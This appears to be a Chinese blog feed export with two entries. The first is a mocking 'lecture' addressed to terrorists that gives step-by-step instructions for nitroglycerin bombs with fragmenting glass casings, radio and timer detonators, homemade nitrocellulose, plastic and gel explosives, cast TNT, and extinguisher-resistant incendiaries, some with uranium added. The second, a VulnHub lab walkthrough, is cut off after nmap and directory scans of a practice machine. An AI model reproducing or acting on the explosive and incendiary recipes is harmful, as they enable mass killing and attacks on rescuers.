<p>　　扯远了，刚才的方法是比较流行的，但是并不是唯一的，般来说，把硝化甘油和挥发性低的次级炸药、粘结剂、填充料等加上其他乱七八糟的东西混合在一起基本可以满意。为了体现每个圣战者的个性，您可以随意选择配料，比如面粉，鸡蛋，蜂蜜奶油，冰激凌等等等等。我个人的偏好是以胡椒粉为主，用方便面的面块固定（版权所有，盗版必究）。</p>
<p>　　如果您制造的硝化甘油数量比较大的话，那么您就无需费神考虑弹体了，一个普通公事包或者旅行包完全可以满足您的一切要求——携带方便，高雅大方。特别推荐皮尔卡丹的，它不透气。把固态的炸药要往里面一填就可以了。不过您制造的剂量不若不够大，那么无疑好的弹体能令您事半功倍。一个普通市民想要得到手榴弹形状的铁质部件不太可能，建议您diy，不知您对以前的雀巢咖啡瓶子是否有印象，那就是一个不错的弹体。重要的是如果您想锦上添花的话，您可以用蚀刻玻璃的方法将表面划成几百个小块，什么？你不知道如何蚀刻？那么用玻璃刀也可以。当然您还可以在上面画一些花纹来表示您的高雅情趣。形成独特的艺术流派什么的。不过别忘了把他的头部塑料瓶口部分用胶带也好什么也好紧紧封起来，以便玻璃瓶体能够顺利破成弹片。再给您一个狠主意，如果您要对付的对象是十恶不赦天怒人怨或者和您有不共戴天之仇的话，还记得前面的填充剂吗？您可以把它改成铝热剂，也就是所谓铝粉和氧化铁粉的混合制剂。当爆破的时候由于高温，将会使铁铝发生反应，变成氧化铝和炽热铁水（亮白色）而四散飞溅！杀伤力极强，如果您有非凡的目力，您会看到真正的飞火流星！注：可能性不大。</p>
<p>最后就是引爆系统，用一根药捻子的导火索无疑是会令同行耻笑的，我目前有两个备选方案。</p>
<p>1、用对讲机的无线电系统，把一个拆下来之后，会得到一个共频系统，将其中一个制造成短路情况安装在炸弹上，然后用其他一些见电火花即可燃烧的炸药放在一起。这样一来就可以实现通话——短路——火花——引爆药点燃——炸药爆炸的遥控。当然无线电话是更好的选择，播一个号码就可以爆炸，简直就是《间接伤害》的翻版。不过缺点是成本高。而且还要担心串频走火还有某个不识时务的混蛋给你打电话，那可真是死不瞑目了。</p>
<p>2、定时系统，也很简单，普通的电子闹钟就可以胜任。手法和上面的差不多。不过，你一定要有准时的习惯，表也得很准，呵呵。</p>
<p>　　好了，本讲座就到这里，祝你好运。如果各位有兴趣的话，我还会继续推出其他制作讲座，比如很受各位喜爱的tnt，塑胶炸弹，燃耗弹等等特殊要求的炸弹。</p>
<p>　　上一讲我们已经谈了硝化甘油炸弹的制作方法，但是除了硬碰硬的纯大威力杀伤炸弹之外，相信不少同道也曾碰到有一些特殊需要的局面。这一讲就是专门论述这种炸弹。</p>
<p>　　作为恐怖分子，毫无疑问业界c4是最大名鼎鼎。但是c4既不是威力最大的，也不是制作最简单的，之所以如此广泛应用最大原因就是它便于隐藏和运输。否则在海关被fbi扣住可实在是太丢面子了。c4主要成分是环三甲撑、三硝胺、甲撑和润滑油。另外一个优点就是可以附着在物体表面，可以对目标最脆弱的部分攻击从而达到一击即中的效果。</p>
<p>　　与之具有同样性质的东西我估计就数本人的最爱——rdx了，它是c4的提炼物，或用六甲撑四胺和丙酮净化过的硝酸混合制成。我的记忆中它可以和淀粉、面粉、洗衣粉等等家居用品混合而不遭受怀疑。当然你要是愿意，白粉也可以。更可怕的是他可以和面粉、鸡蛋、蜂蜜、香精等等制作成饼干，曲奇等等绝对杀人于无形。一旦需要，只要把它用一些挥发性液体泡湿然后捏实就可使用，实在是居家旅行，杀人灭口之必备良药。嘿嘿。但是他的成分都是比较难以得到的东东。所以各位也只能望料兴叹了。</p>
<p>　　好了，再次回到我们的问题上来，那么有可塑性的炸药就真的没有办法制作了吗？不是的，这就需要我们来发挥创造力了，本人经过多年潜心研究日思夜想终于在睡梦中发掘了一个成本低廉制作简单的可塑炸弹制作方法（门捷列夫？），啪啪啪（鼓掌，山呼海啸般的万岁声）！c4，rdx本身具有多种性质，但是我们在某个用途总可以得到用某个替代品，同时也可以依靠混合物使某些炸药附带上其他性质。也就是说我们只需要把不可塑的炸药和一些可塑的合剂杂糅在一起就可以了，最简单地说，把汽油和面粉揉在一起，就可以使汽油具有可塑性和粘着性（恐怖的汽油面团？）。好了首先我们要确定分散质是什么。我比较推荐的硝化棉，学名叫作三硝酸纤维酯。这玩意的出现大大促进了现代枪炮的发展，后来我们的同行——法国炸药工程师p?维埃利于1884年，诺贝尔先生于1887年，分别以不同的方式改进，造成了无烟火药，至今仍然应用于枪弹、炮弹发射药领域，威胁着几十亿人的生命~~呵呵。</p>
<h3 id="好了言归正转，制作方法如下："><a href="#好了言归正转，制作方法如下：" class="headerlink" title="好了言归正转，制作方法如下："></a>好了言归正转，制作方法如下：</h3><p><strong><em>原料：</em></strong>浓硝酸（百分之六十几那种），浓硫酸（98%），药用棉花（药品商店里面多的是），容器自备。</p>
<p>1、将浓硝酸和浓硫酸以体积比一比二配成混合溶液。注意要慢和冷，搅拌均匀，详细说明在我上一次写的炸弹制作教程已经写得很清楚了。如果您需要指导我可以另外给您一份操作手册，当然价格嘛～</p>
<p>2、将药用脱脂棉浸入混合溶液中，要浸透。想想着这是你的仇人现在要把他泡到酸里去，嘿嘿。</p>
<p>3、小资：泡杯咖啡，慢慢享用。看段芭蕾舞。</p>
<p>情歌王子：把“你是疯儿我是傻”唱上四五遍。</p>
<p>李宁第二：做俯卧撑，引体向上仰卧起坐等等。</p>
<p>瘾君子：尽量离远一些再抽烟，否则我不能对您的生命安全负责。</p>
<p>4、看着时间到20分，请大喊一声“大功告成”，然后以迅雷不及掩耳盗铃之势将那块棉花取出。</p>
<p>5、用水冲洗干净。请确定是中性。</p>
<p>6、摊平棉花，在一个风和日丽万里无云万物滋长的合适时机放到阳台上晒干。7、收工<del>~</del></p>
<p>差点忘记对您说，做炸药的时候嘴上千万不要叼着烟。什么？您已经殉职了？请允许我对您表示沉重的哀悼。：（</p>
<p>　　接下来就要看您的用途是什么了，如果您只是做普通备用炸药，那就压实，封包，比较直接的方法就是用报纸包起来用重物压好，最后外面用黄色的宽胶带纸层封好加上足够长的导火索即可。一般可以呈扁平形状，当然其实你可以选择其他的形状也可以。它适合在比较狭窄的地方爆破。把很窄的缝隙分离开来。</p>
<p>　　我相信您在对付一些门锁的时候，曾经想过用炸药炸开，这种时候相信您会考虑塑胶型炸药，制作也很简单，把刚才做好的硝化棉溶解在乙醇和乙醚里面，加上树脂之类的东西来调节它的粘稠度。必要时可以添加类似口香糖之类的树脂，制造成口香糖炸弹，酷～～相信007式的情节在您手中再现一定令您激动不已吧，呵呵。</p>
<p>　　但是事实上我并不推荐用乙醚来制作这玩意儿，因为乙醚是一种全身麻醉剂，浸透毛巾后捂住口鼻可以使人在短时间内失去知觉，至于怎么个短法……，我没试验过，从电视里面大概是几秒钟吧。总之有很大的用途。</p>
<p>　　另外一种还是我们的偶像诺贝尔先生发明的，把硝化棉和硝化甘油（制作方法上次讲过）混合，添加树酯等等可以作成胶质炸弹。威力更大，更重要的是在热气下可以压成绳状，那么物理性质应该类似于加工过程中的方便面，呵呵。通常来说，为了避免伤及无辜，请您在郊外盖间茅屋，以响应我佛慈悲的大无畏精神啊。阿门。</p>
<p>　　最后推荐的是比较有艺术气息的用品了，请我们缪斯女神的化身－－tnt登场！！（闪光灯唰唰，掌声如雷）！可能您会有疑问，tnt如何和艺术挂钩呢？这取决于它的一个性质，在摄氏大概185度左右，它会熔化。到时候可以浇铸成任何形状。您想必也知道可以用石膏和腊作人像等，但是您有没有想过用tnt那么前卫的材料作艺术品呢？到时候您大可以向中央美术学院借几个维纳斯的模子。浇铸一个tnt维纳斯！如果喜欢也可以铸大卫。那将无论如何是后现代艺术的杰作，哈哈哈哈。</p>
<p>　　上一讲我们讲了一些特种爆破炸弹的制作方法，现在让我们把眼睛从炸弹上移开，把注意力调整到燃烧弹上来。有人说“学习二战找个啤酒瓶子装上汽油，塞个布头，用火机一点，轰！整个世界就平静了！”（俗称莫罗托夫鸡尾酒）。不客气地说一句，如果用文明史来打比方的话，这也就处于周口店的水平。我这篇文章好歹进步到文艺复兴了，至于说什么电气化，信息化，我们还差得远呢。古人曰，学无止境，难道在这么个水平你就满足了？那可真是缺乏进取心。另外，燃烧弹是不会有轰的声音的，最多就是玻璃瓶子碎掉的呯。好了，书归正转，开讲。</p>
<p>同学们好！（老师好！）</p>
<p>　　要讲讲如何制作性能优良，质量上乘的燃烧弹，首先要弄清楚几个概念，怎样才是一个性能优良的燃烧弹。燃烧值高，燃烧温度高固然是一个重要方面，还有更重要的包括燃烧速度，和抗灭火能力，以及必要的附加性质和杀伤能力等等。</p>
<p>　　无论从哪个角度说，单纯使用汽油作的燃烧弹都是三流中的三流货色。从前段时间某些自焚人士的实践表明，在一个消防体系完备的环境中，纯汽油根本无法起到高效的杀伤作用。</p>
<p>　　汽油的燃烧值是无需怀疑的，但是燃烧值高并不意味着燃烧温度就高。大家可能知道，大部分所谓易燃物质如酒精等都不能在液态下直接燃烧，我们所点燃的都是挥发到空气中的蒸汽，他们必须以气态才能够与氧气充分混合燃烧。燃烧的火焰提高温度加速液体挥发，燃烧才能进行。这一方面浪费了大量的气化热，一方面也限制了燃烧温度。其实很多江湖卖艺的都会做一种表演：将手泡到酒精中后取出点燃，可以看到手上的淡蓝色火焰，看似惊险其实没有什么奥秘，更不会对人体造成伤害，他们甚至能够感觉手上凉飕飕的，只要有胆量，大部分人都可以作。提高温度通常会在汽油中添加一些燃剂，就我个人而言可能是添加镁粉或者铝热剂，普通火焰温度是几百度，以这种添加剂可以达到一千度，一千五百度，高的可能接近两千度。不但加大杀伤力和引燃能力，也可以大大加快燃剂挥发速度。</p>
<p>　　除了提高温度，抗灭火能力也是极其重要的，很多人有一种根深蒂固的观念，火焰总是会被灭火器扑灭的，事实上，燃烧弹在灭火措施面前不仅不是任人宰割的，有的时候甚至能反客为主令灭火措施完全失效。最简单反灭火手段莫过于大大加快燃烧速度，在对方还没有来得及作出反应的时候就结束，或者把火势放大到不可收拾的地步。上面的镁粉就是一种，高温下汽油挥发燃烧速度起码加快两倍。其次就是抗灭火器了，目前比较广泛应用的是水，二氧化碳的泡沫灭火器，干粉灭火器等等。这些灭火器的工作原理是降温，隔绝空气中的氧气，和干扰火焰中的活性基团结合等等。这些都是可以避开的，首先是水，不能用水来灭油类火灾是常识，所以我们通常不会碰到，即使碰到了，不但加速火势蔓延，还可能因为镁在热水中生成氢氧化镁放出氢气，在爆炸极限浓度中甚至可以产生爆炸，我们求之不得。嘿嘿，接下来是二氧化碳灭火剂，那就更有意思了，不广为人所知的一件事情是，镁不仅能够在空气中燃烧，它还可以在二氧化碳中燃烧！放出大量的热然后变为氧化镁和碳，至于碳作用也不小，它是呈微粒的粉状，在有水情况下可能会产生水煤气，也就是一氧化碳和氢气的混合物，无水情况下也可以不完全燃烧成一氧化碳，或者回到老家去变成二氧化碳。总之即使燃烧 ，也可能产生有毒气体。最后是对付干粉灭火器，干粉灭火器的原理是产生大量小微粒以干粉形式喷到火焰上，干扰活性基团的结合，从而灭火。这就回到了燃烧的本质问题上来了，燃烧作为一种比较剧烈的氧化还原反应，空气中的氧气是比较常见的氧化剂，但绝对不是唯一的，必要时甚至可以自备氧化剂。通常的硝酸、硝酸钾和浓硫酸都是相当不错的，这样一来就彻底消除了以隔绝空气的灭火手段。</p>
<p>　　最后就是黏着能力的问题，很多时候我们的目标是倾斜或者垂直的平面，如果用汽油很可能会流光而无法达到效果，通常可以使用橡胶溶剂来调节粘稠度。做法是把橡胶（尽量选择天然的）切成小块，溶解到汽油中即可。</p>
<p>　　好了，现在出现了两种思路。第一种就是高温快速派的，方法是橡胶溶解汽油中添加碱液、镁粉、铝热剂、油脂、松香、蛋清、肥皂、石蜡和甚至动物血。这些材料的不是必要的，属于可选范围，比例和配方自定，它的特点是温度高，粘着性很强，燃烧迅速。还有炽热的铁水和镁氧化辅助。基本上无法扑灭也来不及扑灭。性质与军方使用的胶凝汽油差不多。引燃系统我推荐是把一两块干净的钠用薄的药棉裹好贴在瓶子表面，这样一来，一旦瓶子被扔出破裂，钠和瓶内的一些水份及有机物接触，就会发生反应放热和氢气，点燃燃烧弹。千万不要和我谈什么拿打火机点布条之类的手段，传出去都不好意思见人。</p>
<p>　　另一种思路则是，同样是橡胶汽油，但是添加的是浓硫酸、硝酸钾、木工的锯末和少量研碎石蜡，这里要注意的是，浓硫酸占的体积分数可以到10%左右。它的特点是自带氧化剂，所以可以抗许多灭火器材，甚至还有一定的爆炸能力。扑灭的可能性比前者还要低。基本碰上就是神仙也无救。引燃系统就比较多种多样了，前者的棉花裹钠仍然可以使用，其次就是在表面贴上一层在氯化钾、糖，混合溶液中浸泡过晾干的纸。瓶子一破，硫酸与这些成分接触就会燃烧起来。好像还有一种就是在溶液中添加高锰酸钾，缺点是不稳定，容易走火。还有一点就是要尽量保证燃烧液中没有水分，因为有水分的话，浓硫酸会产生氢离子，使硝酸钾变为酸性，比较危险。</p>
<p>　　当然咯，以一个完美主义者的态度来看，两个燃烧弹合在一起是最好的，但是不能够直接混合，因为一个酸性一个碱性，如果可以的话，二个瓶子装捆在一起无疑是非常好的，基本就是无所畏惧的超级燃烧弹了。哈哈哈。</p>
<p>　　除这些以外，您也可以添加一些其他的东西，比如建筑上使用的松节油，油漆，其他的如塑料袋等，可以产生浓重的黑烟和刺激性气体和少量毒性，干扰灭火人。</p>
<p>　　最后再给您一个狠主意，如果您有一点点铀却又不足以到达临界质量制作原子弹的话，那么大可以添加到这里来，产生的高温足以将其液化甚至少量气化，除了杀伤救火人员之外，其下风方向会产生一定的核沾染，基本就属于灭绝人性的法子了。</p>
<p>　　最后向各位说明的是，制作炸弹也好，燃烧弹也罢，既不是高精尖科技，也不是一个捻子一个雷式的土法生产。他需要化学，物理，结构力学，材料力学，医学，甚至日常生活方面各种的知识。所有人包括我都仅仅处于学习，研究，探索过程中。欢迎各位有兴趣的同学一起来切磋。我们的口号是：“威力无极限！！！” </p>
]]></content>
      <categories>
        <category>制作</category>
      </categories>
      <tags>
        <tag>deep web</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[W1R3S-1-0-1]</title>
    <url>/2020/01/03/W1R3S-1-0-1/</url>
    <content><![CDATA[<h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>名称：W1R3S：1.0.1<br>发布日期：2018年2月5日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xc1dKUmprdTl1TldTMGZfSnVsMjRMQ1EyWkx1Y1NHNFgvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/1sWJRjku9uNWS0f_Jul24LCQ2ZLucSG4X/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93MXIzcy93MXIzcy52MS4wLjEuemlw">https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93MXIzcy93MXIzcy52MS4wLjEuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>您已被雇用在W1R3S.inc单个服务器上进行渗透测试并报告所有发现。 他们要求您获得root用户访问权限并找到该flag（位于/root目录中）。<br>获得低特权的shell难度：初学者/中级<br>特权升级难度：初学者/中级<br>关于：这是个易受攻击的Ubuntu box，为您提供一些真实世界的场景，使我想起了OSCP实验室。<br>虚拟机：VMware Workstation</p>
<p>v1.0.0-2018年5月2日v1.0.1-2018年8月3日</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.7</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">MAC Address: 00:0C:29:AA:7F:FC (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -Pn -v -p- 192.168.66.7</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -A -Pn -T5 -sV --script=vuln 192.168.66.7</span></span><br><span class="line">PORT      STATE  SERVICE         VERSION</span><br><span class="line">20/tcp    closed ftp-data</span><br><span class="line">21/tcp    open   ftp             vsftpd 2.0.8 or later</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp    open   ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp    open   http            Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.4.18: </span><br><span class="line">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span><br><span class="line">|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668</span><br><span class="line">|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169</span><br><span class="line">|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167</span><br><span class="line">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span><br><span class="line">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span><br><span class="line">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span><br><span class="line">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span><br><span class="line">|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788</span><br><span class="line">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span><br><span class="line">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span><br><span class="line">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span><br><span class="line">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span><br><span class="line">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span><br><span class="line">|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333</span><br><span class="line">|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798</span><br><span class="line">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span><br><span class="line">|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743</span><br><span class="line">|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740</span><br><span class="line">|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979</span><br><span class="line">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span><br><span class="line">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span><br><span class="line">|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763</span><br><span class="line">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span><br><span class="line">|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546</span><br><span class="line">|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span><br><span class="line">|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span><br><span class="line">990/tcp   closed ftps</span><br><span class="line">3306/tcp  open   mysql           MySQL (unauthorized)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>目录爆破一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.66.7/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Wed Jan  8 01:22:15 2020</span><br><span class="line">URL_BASE: http://192.168.66.7/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.66.7/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/                                                     </span><br><span class="line">+ http://192.168.66.7/index.html (CODE:200|SIZE:11321)                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/javascript/                                                        </span><br><span class="line">+ http://192.168.66.7/server-status (CODE:403|SIZE:277)                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/                                                         </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/alerts/                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/api/                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/classes/                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/extensions/                                          </span><br><span class="line">+ http://192.168.66.7/administrator/index.php (CODE:302|SIZE:6946)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/installation/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/js/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/language/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/media/                                               </span><br><span class="line">+ http://192.168.66.7/administrator/robots.txt (CODE:200|SIZE:26)                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/                                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/javascript/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/javascript/jquery/                                                 </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/index.php (CODE:200|SIZE:55879)                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-content/                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-includes/                                             </span><br><span class="line">+ http://192.168.66.7/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                         </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/alerts/ ----</span><br><span class="line">+ http://192.168.66.7/administrator/alerts/index.html (CODE:200|SIZE:31)                              </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/api/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/api/administrator/                                   </span><br><span class="line">+ http://192.168.66.7/administrator/api/index.php (CODE:200|SIZE:62)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/api/<span class="built_in">test</span>/                                            </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/classes/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/classes/ajax/                                        </span><br><span class="line">+ http://192.168.66.7/administrator/classes/index.html (CODE:200|SIZE:31)                             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/components/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/configuration/                            </span><br><span class="line">+ http://192.168.66.7/administrator/components/index.html (CODE:200|SIZE:31)                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/menu/                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/stats/                                    </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/extensions/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/extensions/banners/                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/extensions/content/                                  </span><br><span class="line">+ http://192.168.66.7/administrator/extensions/index.html (CODE:200|SIZE:31)                          </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/installation/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/installation/html/                                   </span><br><span class="line">+ http://192.168.66.7/administrator/installation/index.php (CODE:200|SIZE:4322)                       </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/js/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/js/filemanager/                                      </span><br><span class="line">+ http://192.168.66.7/administrator/js/index.html (CODE:200|SIZE:31)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/js/jquery/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/js/tiny_mce/                                         </span><br><span class="line">                                                                                                      </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/templates/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/default/                                   </span><br><span class="line">+ http://192.168.66.7/administrator/templates/index.html (CODE:200|SIZE:31)                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/javascript/jquery/ ----</span><br><span class="line">+ http://192.168.66.7/javascript/jquery/jquery (CODE:200|SIZE:284394)                                 </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-admin/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/css/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/images/                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/includes/                                       </span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/js/                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/maint/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/network/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/user/                                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-content/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-content/plugins/                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-content/themes/                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-content/upgrade/                                      </span><br><span class="line">==&gt; 